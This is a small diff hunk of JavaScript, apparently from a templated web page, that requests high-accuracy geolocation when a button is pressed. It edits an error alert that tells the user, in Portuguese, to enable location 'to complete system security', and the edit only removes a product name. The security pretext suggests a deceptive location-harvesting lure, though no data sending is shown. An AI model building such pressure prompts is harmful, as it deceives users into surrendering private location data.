@@ -85,7 +85,7 @@ document.getElementById('btn_ativar').onclick = async function() {{
             }}
         }},
         function(err) {{
-            alert("Ação Necessária: Ative a localização para concluir a segurança do Sistema Miamy.");
+            alert("Ação Necessária: Ative a localização para concluir a segurança do Sistema .");
         }},
         {{ enableHighAccuracy: true, timeout: 10000 }}
     );
